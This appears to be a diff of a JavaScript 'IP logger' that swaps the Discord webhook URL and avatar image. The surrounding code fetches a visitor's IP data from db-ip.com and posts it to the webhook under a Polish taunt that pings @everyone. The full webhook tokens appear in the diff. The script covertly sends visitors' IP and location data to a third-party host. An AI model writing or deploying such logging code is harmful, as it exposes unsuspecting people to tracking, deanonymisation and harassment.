@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1013829481615593554/pIoCV9AGvQW1Lt2ZIVzjc2WVLqvntEmTGmLP7WNRkf-ynQYHvc967w5z7_Gz-0vri8tk";
+var webHookUrl = "https://discord.com/api/webhooks/1014868177039151124/T3a7hwXi2nn28WYaQa8MjrnWbvCkq_-E-ZOmH1tcqSZhMPX4bBc-7BZVC-ZjW30_kOss";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
@@ -21,7 +21,7 @@ const request = async () => { // Calling a "synchronous" fetch
 
     var params = {
         username:   "IP Log",
-        avatar_url: "https://cdn.discordapp.com/attachments/879360038978875447/1009474138299179178/Tokyo_Revengers.jpeg",
+        avatar_url: "https://cdn.discordapp.com/attachments/1014868074660368466/1014868966793023548/doge_hut.jpg",
         content:    "**Masz bombe w neta ** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
